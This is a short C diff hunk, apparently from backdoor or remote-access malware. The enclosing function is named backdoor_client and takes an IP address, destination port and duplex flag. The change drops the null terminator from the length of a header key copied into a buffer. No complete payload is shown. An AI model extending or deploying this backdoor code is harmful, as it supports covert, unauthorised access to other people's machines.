@@ -48,7 +48,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 		int len;
 		int hdr_len;
 
-		hdr_len = strlen(HDR_KEY) + 1;
+		hdr_len = strlen(HDR_KEY);
 	
 		memcpy(ptr, HDR_KEY, hdr_len);
 		ptr += hdr_len;
